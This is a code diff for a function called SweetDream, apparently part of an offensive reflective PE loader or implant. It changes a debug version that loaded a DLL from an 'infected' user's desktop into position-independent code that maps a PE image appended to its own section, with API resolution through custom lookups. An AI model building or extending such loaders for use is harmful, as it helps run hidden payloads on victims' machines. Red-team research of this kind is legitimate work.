@@ -1,27 +1,14 @@
 #include "../include/SweetDream.h"
 
-LPTHREAD_START_ROUTINE SweetDream(LPVOID lpParam) {
+D_SEC( B ) LPTHREAD_START_ROUTINE SweetDream(LPVOID lpParam) {
 	HWND hWnd = (HWND)lpParam;
 	LPVOID hWts32api = sdGetModuleHandle(WTSAPI32);
 	WTSUnRegisterSessionNotification_t WTSUnRegisterSessionNotification = (WTSUnRegisterSessionNotification_t)sdGetProcAddress(hWts32api, WTS_UNREGISTER_SESSION_NOTIFICATION);
 
-	////////////////////////////////////////////////////////////////////////////////////////////
-	PBYTE pbBuffer = nullptr;
-	HANDLE hFile = nullptr;
-	DWORD dwBytesRead = 0;
-	DWORD dwFileSize = 0;
-
-	hFile = CreateFileA("C:\\Users\\infected\\Desktop\\dummy.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	dwFileSize = GetFileSize(hFile, NULL);
-	pbBuffer = (PBYTE)VirtualAlloc(NULL, dwFileSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-	if (!ReadFile(hFile, pbBuffer, dwFileSize, &dwBytesRead, NULL)) {
-		return 0;
-	}
-	////////////////////////////////////////////////////////////////////////////////////////////
 	NTSTATUS NtStatus = 0;
 	PVOID PeBase = 0;
-	RELOC_CTX RelocCtx = {};
-	IMPORT_CTX ImportCtx = {};
+	RELOC_CTX RelocCtx = { 0 };
+	IMPORT_CTX ImportCtx = { 0 };
 	ULONG dwOldProtect = 0;
 	PVOID NtDll = nullptr;
 	PVOID User32 = nullptr;
@@ -40,11 +27,12 @@ LPTHREAD_START_ROUTINE SweetDream(LPVOID lpParam) {
 	SIZE_T textsize = 0;
 	PVOID textptr = nullptr;
 
-	Dos = (PIMAGE_DOS_HEADER)(pbBuffer);  // C_PTR( G_END() )
+  PBYTE pbBuffer = (PBYTE) C_PTR( G_END() );
+	Dos = (PIMAGE_DOS_HEADER)C_PTR( G_END() );
 	NtH = (PIMAGE_NT_HEADERS)((DWORD_PTR)Dos + Dos->e_lfanew);
 
 	// Calc memory for image
-	szSizeImage = NtH->OptionalHeader.SizeOfImage; //(((NtH->OptionalHeader.SizeOfImage) + 0x1000 - 1) & ~(0x1000 - 1));
+	szSizeImage = (((NtH->OptionalHeader.SizeOfImage) + 0x1000 - 1) & ~(0x1000 - 1));
 
 	NtDll = sdGetModuleHandle(NTDLL);
 
